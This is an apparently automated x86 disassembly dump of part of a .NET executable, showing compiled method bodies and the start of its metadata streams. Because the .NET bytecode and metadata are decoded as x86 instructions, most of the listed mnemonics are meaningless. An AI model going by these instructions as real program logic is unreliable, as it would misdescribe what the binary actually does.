  4040e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e2:	da 00                	fiaddl (%eax)
  4040e4:	00 0a                	add    %cl,(%edx)
  4040e6:	00 08                	add    %cl,(%eax)
  4040e8:	18 6f db             	sbb    %ch,-0x25(%edi)
  4040eb:	00 00                	add    %al,(%eax)
  4040ed:	0a 00                	or     (%eax),%al
  4040ef:	08 02                	or     %al,(%edx)
  4040f1:	7b 26                	jnp    0x404119
  4040f3:	00 00                	add    %al,(%eax)
  4040f5:	04 6f                	add    $0x6f,%al
  4040f7:	dc 00                	faddl  (%eax)
  4040f9:	00 0a                	add    %cl,(%edx)
  4040fb:	00 02                	add    %al,(%edx)
  4040fd:	7b 27                	jnp    0x404126
  4040ff:	00 00                	add    %al,(%eax)
  404101:	04 73                	add    $0x73,%al
  404103:	e2 00                	loop   0x404105
  404105:	00 0a                	add    %cl,(%edx)
  404107:	13 04 00             	adc    (%eax,%eax,1),%eax
  40410a:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40410d:	6f                   	outsl  %ds:(%esi),(%dx)
  40410e:	e3 00                	jecxz  0x404110
  404110:	00 0a                	add    %cl,(%edx)
  404112:	1f                   	pop    %ds
  404113:	20 07                	and    %al,(%edi)
  404115:	6f                   	outsl  %ds:(%esi),(%dx)
  404116:	e3 00                	jecxz  0x404118
  404118:	00 0a                	add    %cl,(%edx)
  40411a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40411d:	20 59 6f             	and    %bl,0x6f(%ecx)
  404120:	e4 00                	in     $0x0,%al
  404122:	00 0a                	add    %cl,(%edx)
  404124:	13 05 1f 20 8d 59    	adc    0x598d201f,%eax
  40412a:	00 00                	add    %al,(%eax)
  40412c:	01 13                	add    %edx,(%ebx)
  40412e:	06                   	push   %es
  40412f:	07                   	pop    %es
  404130:	11 06                	adc    %eax,(%esi)
  404132:	16                   	push   %ss
  404133:	11 06                	adc    %eax,(%esi)
  404135:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404138:	41                   	inc    %ecx
  404139:	00 00                	add    %al,(%eax)
  40413b:	0a 26                	or     (%esi),%ah
  40413d:	02 11                	add    (%ecx),%dl
  40413f:	05 11 06 28 51       	add    $0x51280611,%eax
  404144:	00 00                	add    %al,(%eax)
  404146:	06                   	push   %es
  404147:	16                   	push   %ss
  404148:	fe 01                	incb   (%ecx)
  40414a:	13 07                	adc    (%edi),%eax
  40414c:	11 07                	adc    %eax,(%edi)
  40414e:	2c 0b                	sub    $0xb,%al
  404150:	72 ab                	jb     0x4040fd
  404152:	07                   	pop    %es
  404153:	00 70 73             	add    %dh,0x73(%eax)
  404156:	e6 00                	out    %al,$0x0
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	7a 00                	jp     0x40415c
  40415c:	de 0d 11 04 2c 08    	fimuls 0x82c0411
  404162:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404165:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40416a:	dc 1f                	fcompl (%edi)
  40416c:	10 8d 59 00 00 01    	adc    %cl,0x1000059(%ebp)
  404172:	0d 07 09 16 1f       	or     $0x1f160907,%eax
  404177:	10 6f 41             	adc    %ch,0x41(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 26                	or     (%esi),%ah
  40417e:	08 09                	or     %cl,(%ecx)
  404180:	6f                   	outsl  %ds:(%esi),(%dx)
  404181:	e7 00                	out    %eax,$0x0
  404183:	00 0a                	add    %cl,(%edx)
  404185:	00 07                	add    %al,(%edi)
  404187:	08 6f e8             	or     %ch,-0x18(%edi)
  40418a:	00 00                	add    %al,(%eax)
  40418c:	0a 16                	or     (%esi),%dl
  40418e:	73 df                	jae    0x40416f
  404190:	00 00                	add    %al,(%eax)
  404192:	0a 13                	or     (%ebx),%dl
  404194:	08 00                	or     %al,(%eax)
  404196:	07                   	pop    %es
  404197:	6f                   	outsl  %ds:(%esi),(%dx)
  404198:	e9 00 00 0a 1f       	jmp    0x1f4a419d
  40419d:	10 6a 59             	adc    %ch,0x59(%edx)
  4041a0:	17                   	pop    %ss
  4041a1:	6a 58                	push   $0x58
  4041a3:	d4 8d                	aam    $0x8d
  4041a5:	59                   	pop    %ecx
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	01 13                	add    %edx,(%ebx)
  4041aa:	09 11                	or     %edx,(%ecx)
  4041ac:	08 11                	or     %dl,(%ecx)
  4041ae:	09 16                	or     %edx,(%esi)
  4041b0:	11 09                	adc    %ecx,(%ecx)
  4041b2:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041b5:	41                   	inc    %ecx
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	0a 8d 59 00 00 01    	or     0x1000059(%ebp),%cl
  4041be:	13 0a                	adc    (%edx),%ecx
  4041c0:	11 09                	adc    %ecx,(%ecx)
  4041c2:	16                   	push   %ss
  4041c3:	11 0a                	adc    %ecx,(%edx)
  4041c5:	16                   	push   %ss
  4041c6:	11 0a                	adc    %ecx,(%edx)
  4041c8:	8e 69 28             	mov    0x28(%ecx),%gs
  4041cb:	ea 00 00 0a 00 11 0a 	ljmp   $0xa11,$0xa0000
  4041d2:	13 0b                	adc    (%ebx),%ecx
  4041d4:	de 23                	fisubs (%ebx)
  4041d6:	11 08                	adc    %ecx,(%eax)
  4041d8:	2c 08                	sub    $0x8,%al
  4041da:	11 08                	adc    %ecx,(%eax)
  4041dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4041dd:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4041e2:	dc 08                	fmull  (%eax)
  4041e4:	2c 07                	sub    $0x7,%al
  4041e6:	08 6f 2d             	or     %ch,0x2d(%edi)
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	0a 00                	or     (%eax),%al
  4041ed:	dc 07                	faddl  (%edi)
  4041ef:	2c 07                	sub    $0x7,%al
  4041f1:	07                   	pop    %es
  4041f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f3:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4041f8:	dc 11                	fcoml  (%ecx)
  4041fa:	0b 2a                	or     (%edx),%ebp
  4041fc:	41                   	inc    %ecx
  4041fd:	64 00 00             	add    %al,%fs:(%eax)
  404200:	02 00                	add    (%eax),%al
  404202:	00 00                	add    %al,(%eax)
  404204:	65 00 00             	add    %al,%gs:(%eax)
  404207:	00 55 00             	add    %dl,0x0(%ebp)
  40420a:	00 00                	add    %al,(%eax)
  40420c:	ba 00 00 00 0d       	mov    $0xd000000,%edx
  404211:	00 00                	add    %al,(%eax)
  404213:	00 00                	add    %al,(%eax)
  404215:	00 00                	add    %al,(%eax)
  404217:	00 02                	add    %al,(%edx)
  404219:	00 00                	add    %al,(%eax)
  40421b:	00 f1                	add    %dh,%cl
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 41 00             	add    %al,0x0(%ecx)
  404222:	00 00                	add    %al,(%eax)
  404224:	32 01                	xor    (%ecx),%al
  404226:	00 00                	add    %al,(%eax)
  404228:	0d 00 00 00 00       	or     $0x0,%eax
  40422d:	00 00                	add    %al,(%eax)
  40422f:	00 02                	add    %al,(%edx)
  404231:	00 00                	add    %al,(%eax)
  404233:	00 22                	add    %ah,(%edx)
  404235:	00 00                	add    %al,(%eax)
  404237:	00 1d 01 00 00 3f    	add    %bl,0x3f000001
  40423d:	01 00                	add    %eax,(%eax)
  40423f:	00 0b                	add    %cl,(%ebx)
  404241:	00 00                	add    %al,(%eax)
  404243:	00 00                	add    %al,(%eax)
  404245:	00 00                	add    %al,(%eax)
  404247:	00 02                	add    %al,(%edx)
  404249:	00 00                	add    %al,(%eax)
  40424b:	00 1b                	add    %bl,(%ebx)
  40424d:	00 00                	add    %al,(%eax)
  40424f:	00 2f                	add    %ch,(%edi)
  404251:	01 00                	add    %eax,(%eax)
  404253:	00 4a 01             	add    %cl,0x1(%edx)
  404256:	00 00                	add    %al,(%eax)
  404258:	0b 00                	or     (%eax),%eax
  40425a:	00 00                	add    %al,(%eax)
  40425c:	00 00                	add    %al,(%eax)
  40425e:	00 00                	add    %al,(%eax)
  404260:	13 30                	adc    (%eax),%esi
  404262:	03 00                	add    (%eax),%eax
  404264:	30 00                	xor    %al,(%eax)
  404266:	00 00                	add    %al,(%eax)
  404268:	1c 00                	sbb    $0x0,%al
  40426a:	00 11                	add    %dl,(%ecx)
  40426c:	00 17                	add    %dl,(%edi)
  40426e:	0a 16                	or     (%esi),%dl
  404270:	0b 2b                	or     (%ebx),%ebp
  404272:	17                   	pop    %ss
  404273:	00 03                	add    %al,(%ebx)
  404275:	07                   	pop    %es
  404276:	91                   	xchg   %eax,%ecx
  404277:	04 07                	add    $0x7,%al
  404279:	91                   	xchg   %eax,%ecx
  40427a:	fe 01                	incb   (%ecx)
  40427c:	16                   	push   %ss
  40427d:	fe 01                	incb   (%ecx)
  40427f:	0c 08                	or     $0x8,%al
  404281:	2c 02                	sub    $0x2,%al
  404283:	16                   	push   %ss
  404284:	0a 00                	or     (%eax),%al
  404286:	07                   	pop    %es
  404287:	17                   	pop    %ss
  404288:	58                   	pop    %eax
  404289:	0b 07                	or     (%edi),%eax
  40428b:	03 8e 69 fe 04 0d    	add    0xd04fe69(%esi),%ecx
  404291:	09 2d df 06 13 04    	or     %ebp,0x41306df
  404297:	2b 00                	sub    (%eax),%eax
  404299:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  40429c:	62 1f                	bound  %ebx,(%edi)
  40429e:	20 8d 59 00 00 01    	and    %cl,0x1000059(%ebp)
  4042a4:	25 d0 29 00 00       	and    $0x29d0,%eax
  4042a9:	04 28                	add    $0x28,%al
  4042ab:	eb 00                	jmp    0x4042ad
  4042ad:	00 0a                	add    %cl,(%edx)
  4042af:	80 28 00             	subb   $0x0,(%eax)
  4042b2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	00 1b                	add    %bl,(%ebx)
  4042b9:	30 03                	xor    %al,(%ebx)
  4042bb:	00 70 00             	add    %dh,0x0(%eax)
  4042be:	00 00                	add    %al,(%eax)
  4042c0:	1d 00 00 11 00       	sbb    $0x110000,%eax
  4042c5:	28 17                	sub    %dl,(%edi)
  4042c7:	00 00                	add    %al,(%eax)
  4042c9:	0a 02                	or     (%edx),%al
  4042cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4042cc:	18 00                	sbb    %al,(%eax)
  4042ce:	00 0a                	add    %cl,(%edx)
  4042d0:	0a 73 ec             	or     -0x14(%ebx),%dh
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4042d8:	08 06                	or     %al,(%esi)
  4042da:	6f                   	outsl  %ds:(%esi),(%dx)
  4042db:	90                   	nop
  4042dc:	00 00                	add    %al,(%eax)
  4042de:	0a 0a                	or     (%edx),%cl
  4042e0:	00 de                	add    %bl,%dh
  4042e2:	0b 08                	or     (%eax),%ecx
  4042e4:	2c 07                	sub    $0x7,%al
  4042e6:	08 6f 2d             	or     %ch,0x2d(%edi)
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	0a 00                	or     (%eax),%al
  4042ed:	dc 73 91             	fdivl  -0x6f(%ebx)
  4042f0:	00 00                	add    %al,(%eax)
  4042f2:	0a 0b                	or     (%ebx),%cl
  4042f4:	00 06                	add    %al,(%esi)
  4042f6:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4042fb:	1f                   	pop    %ds
  4042fc:	09 11                	or     %edx,(%ecx)
  4042fe:	04 91                	add    $0x91,%al
  404300:	13 05 07 12 05 72    	adc    0x72051207,%eax
  404306:	01 08                	add    %ecx,(%eax)
  404308:	00 70 28             	add    %dh,0x28(%eax)
  40430b:	92                   	xchg   %eax,%edx
  40430c:	00 00                	add    %al,(%eax)
  40430e:	0a 6f 93             	or     -0x6d(%edi),%ch
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 26                	or     (%esi),%ah
  404315:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404318:	58                   	pop    %eax
  404319:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40431c:	04 09                	add    $0x9,%al
  40431e:	8e 69 32             	mov    0x32(%ecx),%gs
  404321:	da 07                	fiaddl (%edi)
  404323:	6f                   	outsl  %ds:(%esi),(%dx)
  404324:	33 00                	xor    (%eax),%eax
  404326:	00 0a                	add    %cl,(%edx)
  404328:	6f                   	outsl  %ds:(%esi),(%dx)
  404329:	95                   	xchg   %eax,%ebp
  40432a:	00 00                	add    %al,(%eax)
  40432c:	0a 13                	or     (%ebx),%dl
  40432e:	06                   	push   %es
  40432f:	2b 00                	sub    (%eax),%eax
  404331:	11 06                	adc    %eax,(%esi)
  404333:	2a 01                	sub    (%ecx),%al
  404335:	10 00                	adc    %al,(%eax)
  404337:	00 02                	add    %al,(%edx)
  404339:	00 13                	add    %dl,(%ebx)
  40433b:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  40433e:	00 0b                	add    %cl,(%ebx)
  404340:	00 00                	add    %al,(%eax)
  404342:	00 00                	add    %al,(%eax)
  404344:	1b 30                	sbb    (%eax),%esi
  404346:	02 00                	add    (%eax),%al
  404348:	1f                   	pop    %ds
  404349:	00 00                	add    %al,(%eax)
  40434b:	00 1e                	add    %bl,(%esi)
  40434d:	00 00                	add    %al,(%eax)
  40434f:	11 00                	adc    %eax,(%eax)
  404351:	73 ec                	jae    0x40433f
  404353:	00 00                	add    %al,(%eax)
  404355:	0a 0a                	or     (%edx),%cl
  404357:	00 06                	add    %al,(%esi)
  404359:	02 6f 90             	add    -0x70(%edi),%ch
  40435c:	00 00                	add    %al,(%eax)
  40435e:	0a 0b                	or     (%ebx),%cl
  404360:	de 0b                	fimuls (%ebx)
  404362:	06                   	push   %es
  404363:	2c 07                	sub    $0x7,%al
  404365:	06                   	push   %es
  404366:	6f                   	outsl  %ds:(%esi),(%dx)
  404367:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40436c:	dc 07                	faddl  (%edi)
  40436e:	2a 00                	sub    (%eax),%al
  404370:	01 10                	add    %edx,(%eax)
  404372:	00 00                	add    %al,(%eax)
  404374:	02 00                	add    (%eax),%al
  404376:	07                   	pop    %es
  404377:	00 0b                	add    %cl,(%ebx)
  404379:	12 00                	adc    (%eax),%al
  40437b:	0b 00                	or     (%eax),%eax
  40437d:	00 00                	add    %al,(%eax)
  40437f:	00 42 53             	add    %al,0x53(%edx)
  404382:	4a                   	dec    %edx
  404383:	42                   	inc    %edx
  404384:	01 00                	add    %eax,(%eax)
  404386:	01 00                	add    %eax,(%eax)
  404388:	00 00                	add    %al,(%eax)
  40438a:	00 00                	add    %al,(%eax)
  40438c:	0c 00                	or     $0x0,%al
  40438e:	00 00                	add    %al,(%eax)
  404390:	76 34                	jbe    0x4043c6
  404392:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404395:	33 30                	xor    (%eax),%esi
  404397:	33 31                	xor    (%ecx),%esi
  404399:	39 00                	cmp    %eax,(%eax)
  40439b:	00 00                	add    %al,(%eax)
  40439d:	00 05 00 6c 00 00    	add    %al,0x6c00
  4043a3:	00 24 15 00 00 23 7e 	add    %ah,0x7e230000(,%edx,1)
  4043aa:	00 00                	add    %al,(%eax)
  4043ac:	90                   	nop
  4043ad:	15 00 00 e4 18       	adc    $0x18e40000,%eax
  4043b2:	00 00                	add    %al,(%eax)
  4043b4:	23 53 74             	and    0x74(%ebx),%edx
  4043b7:	72 69                	jb     0x404422
  4043b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4043ba:	67 73 00             	addr16 jae 0x4043bd
  4043bd:	00 00                	add    %al,(%eax)
  4043bf:	00 74 2e 00          	add    %dh,0x0(%esi,%ebp,1)
  4043c3:	00 08                	add    %cl,(%eax)
  4043c5:	08 00                	or     %al,(%eax)
  4043c7:	00 23                	add    %ah,(%ebx)
  4043c9:	55                   	push   %ebp
  4043ca:	53                   	push   %ebx
  4043cb:	00 7c 36 00          	add    %bh,0x0(%esi,%esi,1)
  4043cf:	00 10                	add    %dl,(%eax)
  4043d1:	00 00                	add    %al,(%eax)
  4043d3:	00 23                	add    %ah,(%ebx)
  4043d5:	47                   	inc    %edi
  4043d6:	55                   	push   %ebp
  4043d7:	49                   	dec    %ecx
  4043d8:	44                   	inc    %esp
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 8c 36 00 00 44 07 	add    %cl,0x7440000(%esi,%esi,1)
  4043e2:	00 00                	add    %al,(%eax)
  4043e4:	23 42 6c             	and    0x6c(%edx),%eax
  4043e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e8:	62 00                	bound  %eax,(%eax)
  4043ea:	00 00                	add    %al,(%eax)
  4043ec:	00 00                	add    %al,(%eax)
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	02 00                	add    (%eax),%al
  4043f2:	00 01                	add    %al,(%ecx)
  4043f4:	57                   	push   %edi
  4043f5:	9d                   	popf
  4043f6:	a2 3d 09 0a 00       	mov    %al,0xa093d
  4043fb:	00 00                	add    %al,(%eax)
  4043fd:	fa                   	cli
  4043fe:	01 33                	add    %esi,(%ebx)
  404400:	00 16                	add    %dl,(%esi)
  404402:	00 00                	add    %al,(%eax)
  404404:	01 00                	add    %eax,(%eax)
  404406:	00 00                	add    %al,(%eax)
  404408:	95                   	xchg   %eax,%ebp
  404409:	00 00                	add    %al,(%eax)
  40440b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40440e:	00 00                	add    %al,(%eax)
  404410:	2e 00 00             	add    %al,%cs:(%eax)
  404413:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  404417:	00 32                	add    %dh,(%edx)
  404419:	00 00                	add    %al,(%eax)
  40441b:	00 ec                	add    %ch,%ah
  40441d:	00 00                	add    %al,(%eax)
  40441f:	00 07                	add    %al,(%edi)
  404421:	00 00                	add    %al,(%eax)
  404423:	00 3a                	add    %bh,(%edx)
  404425:	00 00                	add    %al,(%eax)
  404427:	00 01                	add    %al,(%ecx)
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 1e                	add    %bl,(%esi)
  40442d:	00 00                	add    %al,(%eax)
  40442f:	00 01                	add    %al,(%ecx)
  404431:	00 00                	add    %al,(%eax)
  404433:	00 0b                	add    %cl,(%ebx)
  404435:	00 00                	add    %al,(%eax)
  404437:	00 15 00 00 00 03    	add    %dl,0x3000000
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 06                	add    %al,(%esi)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 06                	add    %al,(%esi)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 01                	add    %al,(%ecx)
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 01                	add    %al,(%ecx)
  40444d:	00 00                	add    %al,(%eax)
  40444f:	00 09                	add    %cl,(%ecx)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 03                	add    %al,(%ebx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 01                	add    %al,(%ecx)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 00                	add    %al,(%eax)
  40445d:	00 4e 09             	add    %cl,0x9(%esi)
  404460:	01 00                	add    %eax,(%eax)
  404462:	00 00                	add    %al,(%eax)
  404464:	00 00                	add    %al,(%eax)
  404466:	06                   	push   %es
  404467:	00 63 08             	add    %ah,0x8(%ebx)
  40446a:	7f 12                	jg     0x40447e
  40446c:	06                   	push   %es
  40446d:	00 d0                	add    %dl,%al
  40446f:	08 7f 12             	or     %bh,0x12(%edi)
  404472:	06                   	push   %es
  404473:	00 7c 07 21          	add    %bh,0x21(%edi,%eax,1)
  404477:	12 0f                	adc    (%edi),%cl
  404479:	00 9f 12 00 00 06    	add    %bl,0x6000012(%edi)
  40447f:	00 bf 07 b5 0e 06    	add    %bh,0x60eb507(%edi)
  404485:	00 46 08             	add    %al,0x8(%esi)
  404488:	b5 0e                	mov    $0xe,%ch
  40448a:	06                   	push   %es
  40448b:	00 27                	add    %ah,(%edi)
  40448d:	08 b5 0e 06 00 b7    	or     %dh,-0x48fff9f2(%ebp)
  404493:	08 b5 0e 06 00 83    	or     %dh,-0x7cfff9f2(%ebp)
  404499:	08 b5 0e 06 00 9c    	or     %dh,-0x63fff9f2(%ebp)
  40449f:	08 b5 0e 06 00 d6    	or     %dh,-0x29fff9f2(%ebp)
  4044a5:	07                   	pop    %es
  4044a6:	b5 0e                	mov    $0xe,%ch
  4044a8:	06                   	push   %es
  4044a9:	00 ab 07 60 12 06    	add    %ch,0x6126007(%ebx)
  4044af:	00 0a                	add    %cl,(%edx)
  4044b1:	08 b5 0e 06 00 f1    	or     %dh,-0xefff9f2(%ebp)
  4044b7:	07                   	pop    %es
  4044b8:	5d                   	pop    %ebp
  4044b9:	0a 06                	or     (%esi),%al
  4044bb:	00 40 15             	add    %al,0x15(%eax)
  4044be:	9d                   	popf
  4044bf:	0d 0a 00 77 00       	or     $0x77000a,%eax
  4044c4:	e7 12                	out    %eax,$0x12
  4044c6:	06                   	push   %es
  4044c7:	00 3d 10 37 18 06    	add    %bh,0x6183710
  4044cd:	00 50 0f             	add    %dl,0xf(%eax)
  4044d0:	9d                   	popf
  4044d1:	0d 06 00 61 07       	or     $0x7610006,%eax
  4044d6:	7f 12                	jg     0x4044ea
  4044d8:	06                   	push   %es
  4044d9:	00 1c 07             	add    %bl,(%edi,%eax,1)
  4044dc:	21 12                	and    %edx,(%edx)
  4044de:	06                   	push   %es
  4044df:	00 90 07 21 12 0a    	add    %dl,0xa122107(%eax)
  4044e5:	00 a6 15 bd 14 0a    	add    %ah,0xa14bd15(%esi)
  4044eb:	00 54 0d af          	add    %dl,-0x51(%ebp,%ecx,1)
  4044ef:	18 06                	sbb    %al,(%esi)
  4044f1:	00 3e                	add    %bh,(%esi)
  4044f3:	11 f3                	adc    %esi,%ebx
  4044f5:	09 0a                	or     %ecx,(%edx)
  4044f7:	00 a8 14 65 15 0a    	add    %ch,0xa156514(%eax)
  4044fd:	00 f9                	add    %bh,%cl
  4044ff:	15 65 15 0a 00       	adc    $0xa1565,%eax
  404504:	93                   	xchg   %eax,%ebx
  404505:	0c 65                	or     $0x65,%al
  404507:	15 06 00 df 06       	adc    $0x6df0006,%eax
  40450c:	e7 12                	out    %eax,$0x12
  40450e:	0a 00                	or     (%eax),%al
  404510:	1e                   	push   %ds
  404511:	0e                   	push   %cs
  404512:	e7 12                	out    %eax,$0x12
  404514:	0a 00                	or     (%eax),%al
  404516:	6d                   	insl   (%dx),%es:(%edi)
  404517:	14 af                	adc    $0xaf,%al
  404519:	18 06                	sbb    %al,(%esi)
  40451b:	00 db                	add    %bl,%bl
  40451d:	15 9d 0d 06 00       	adc    $0x60d9d,%eax
  404522:	51                   	push   %ecx
  404523:	02 f3                	add    %bl,%dh
  404525:	09 06                	or     %eax,(%esi)
  404527:	00 6b 0d             	add    %ch,0xd(%ebx)
  40452a:	84 01                	test   %al,(%ecx)
  40452c:	0e                   	push   %cs
  40452d:	00 dd                	add    %bl,%ch
  40452f:	0b c2                	or     %edx,%eax
  404531:	0b 06                	or     (%esi),%eax
  404533:	00 72 0f             	add    %dh,0xf(%edx)
  404536:	84 01                	test   %al,(%ecx)
  404538:	06                   	push   %es
  404539:	00 3b                	add    %bh,(%ebx)
  40453b:	0d 84 01 0a 00       	or     $0xa0184,%eax
  404540:	a0 14 21 12 0a       	mov    0xa122114,%al
  404545:	00 b4 0f 21 12 06 00 	add    %dh,0x61221(%edi,%ecx,1)
  40454c:	26 18 55 00          	sbb    %dl,%es:0x0(%ebp)
  404550:	06                   	push   %es
  404551:	00 79 11             	add    %bh,0x11(%ecx)
  404554:	84 01                	test   %al,(%ecx)
  404556:	12 00                	adc    (%eax),%al
  404558:	06                   	push   %es
  404559:	11 61 16             	adc    %esp,0x16(%ecx)
  40455c:	12 00                	adc    (%eax),%al
  40455e:	e1 0e                	loope  0x40456e
  404560:	61                   	popa
  404561:	16                   	push   %ss
  404562:	ab                   	stos   %eax,%es:(%edi)
  404563:	00 b2 11 00 00 12    	add    %dh,0x12000011(%edx)
  404569:	00 22                	add    %ah,(%edx)
  40456b:	15 61 16 06 00       	adc    $0x61661,%eax
  404570:	24 10                	and    $0x10,%al
  404572:	37                   	aaa
  404573:	18 06                	sbb    %al,(%esi)
  404575:	00 6f 10             	add    %ch,0x10(%edi)
  404578:	55                   	push   %ebp
  404579:	17                   	pop    %ss
  40457a:	06                   	push   %es
  40457b:	00 33                	add    %dh,(%ebx)
  40457d:	06                   	push   %es
  40457e:	9d                   	popf
  40457f:	0d 06 00 2b 00       	or     $0x2b0006,%eax
  404584:	01 02                	add    %eax,(%edx)
  404586:	16                   	push   %ss
  404587:	00 5a 0f             	add    %bl,0xf(%edx)
  40458a:	46                   	inc    %esi
  40458b:	0a 16                	or     (%esi),%dl
  40458d:	00 0f                	add    %cl,(%edi)
  40458f:	15 46 0a 06 00       	adc    $0x60a46,%eax
  404594:	ac                   	lods   %ds:(%esi),%al
  404595:	17                   	pop    %ss
  404596:	f3 09 06             	repz or %eax,(%esi)
  404599:	00 02                	add    %al,(%edx)
  40459b:	0e                   	push   %cs
  40459c:	9d                   	popf
  40459d:	0d 0a 00 b3 13       	or     $0x13b3000a,%eax
  4045a2:	55                   	push   %ebp
  4045a3:	00 c3                	add    %al,%bl
  4045a5:	00 d0                	add    %dl,%al
  4045a7:	11 00                	adc    %eax,(%eax)
  4045a9:	00 06                	add    %al,(%esi)
  4045ab:	00 54 18 b5          	add    %dl,-0x4b(%eax,%ebx,1)
  4045af:	0e                   	push   %cs
  4045b0:	06                   	push   %es
  4045b1:	00 a5 06 9d 0d 1a    	add    %ah,0x1a0d9d06(%ebp)
  4045b7:	00 20                	add    %ah,(%eax)
  4045b9:	00 7f 12             	add    %bh,0x12(%edi)
  4045bc:	1a 00                	sbb    (%eax),%al
  4045be:	01 00                	add    %eax,(%eax)
  4045c0:	9d                   	popf
  4045c1:	0d 1a 00 52 07       	or     $0x752001a,%eax
  4045c6:	7f 12                	jg     0x4045da
  4045c8:	06                   	push   %es
  4045c9:	00 22                	add    %ah,(%edx)
  4045cb:	13 37                	adc    (%edi),%esi
  4045cd:	18 1a                	sbb    %bl,(%edx)
  4045cf:	00 56 10             	add    %dl,0x10(%esi)
  4045d2:	37                   	aaa
  4045d3:	18 06                	sbb    %al,(%esi)
  4045d5:	00 5e 0d             	add    %bl,0xd(%esi)
  4045d8:	37                   	aaa
  4045d9:	18 06                	sbb    %al,(%esi)
  4045db:	00 94 00 37 18 06 00 	add    %dl,0x61837(%eax,%eax,1)
  4045e2:	61                   	popa
  4045e3:	02 37                	add    (%edi),%dh
  4045e5:	18 06                	sbb    %al,(%esi)
  4045e7:	00 80 06 9d 0d 06    	add    %al,0x60d9d06(%eax)
  4045ed:	00 2e                	add    %ch,(%esi)
  4045ef:	17                   	pop    %ss
  4045f0:	9d                   	popf
  4045f1:	0d 06 00 73 16       	or     $0x16730006,%eax
  4045f6:	9d                   	popf
  4045f7:	0d 0a 00 09 18       	or     $0x1809000a,%eax
  4045fc:	e7 12                	out    %eax,$0x12
  4045fe:	06                   	push   %es
  4045ff:	00 c8                	add    %cl,%al
  404601:	0d 37 18 06 00       	or     $0x61837,%eax
  404606:	3d 0a 55 17 06       	cmp    $0x617550a,%eax
  40460b:	00 ca                	add    %cl,%dl
  40460d:	09 37                	or     %esi,(%edi)
  40460f:	18 0a                	sbb    %cl,(%edx)
  404611:	00 5d 18             	add    %bl,0x18(%ebp)
  404614:	bd 14 0a 00 9f       	mov    $0x9f000a14,%ebp
  404619:	06                   	push   %es
  40461a:	bd 14 0a 00 8a       	mov    $0x8a000a14,%ebp
  40461f:	06                   	push   %es
  404620:	bd 14 06 00 d8       	mov    $0xd8000614,%ebp
  404625:	0a 9d 0d 06 00 12    	or     0x1200060d(%ebp),%bl
  40462b:	10 9d 0d 06 00 ea    	adc    %bl,-0x15fff9f3(%ebp)
  404631:	0d 9d 0d 0a 00       	or     $0xa0d9d,%eax
  404636:	2d 14 65 15 0a       	sub    $0xa156514,%eax
  40463b:	00 ee                	add    %ch,%dh
  40463d:	13 65 15             	adc    0x15(%ebp),%esp
  404640:	06                   	push   %es
  404641:	00 3a                	add    %bh,(%edx)
  404643:	14 9d                	adc    $0x9d,%al
  404645:	0d 06 00 a3 04       	or     $0x4a30006,%eax
  40464a:	9d                   	popf
  40464b:	0d 0a 00 2e 0b       	or     $0xb2e000a,%eax
  404650:	21 12                	and    %edx,(%edx)
  404652:	0a 00                	or     (%eax),%al
  404654:	46                   	inc    %esi
  404655:	0d bd 14 0a 00       	or     $0xa14bd,%eax
  40465a:	f3 0b af 18 06 00 71 	repz or 0x71000618(%edi),%ebp
  404661:	0d 84 01 0a 00       	or     $0xa0184,%eax
  404666:	cd 16                	int    $0x16
  404668:	65 15 0a 00 c7 0e    	gs adc $0xec7000a,%eax
  40466e:	e7 12                	out    %eax,$0x12
  404670:	0a 00                	or     (%eax),%al
  404672:	0b 14 96             	or     (%esi,%edx,4),%edx
  404675:	0e                   	push   %cs
  404676:	06                   	push   %es
  404677:	00 02                	add    %al,(%edx)
  404679:	09 9d 0d 06 00 17    	or     %ebx,0x1700060d(%ebp)
  40467f:	0c f3                	or     $0xf3,%al
  404681:	09 06                	or     %eax,(%esi)
  404683:	00 e5                	add    %ah,%ch
  404685:	0b 9d 0d 0a 00 b5    	or     -0x4afff5f3(%ebp),%ebx
  40468b:	0b 9d 0d 0a 00 70    	or     0x70000a0d(%ebp),%ebx
  404691:	06                   	push   %es
  404692:	9d                   	popf
  404693:	0d 06 00 97 11       	or     $0x11970006,%eax
  404698:	9d                   	popf
  404699:	0d 06 00 8e 00       	or     $0x8e0006,%eax
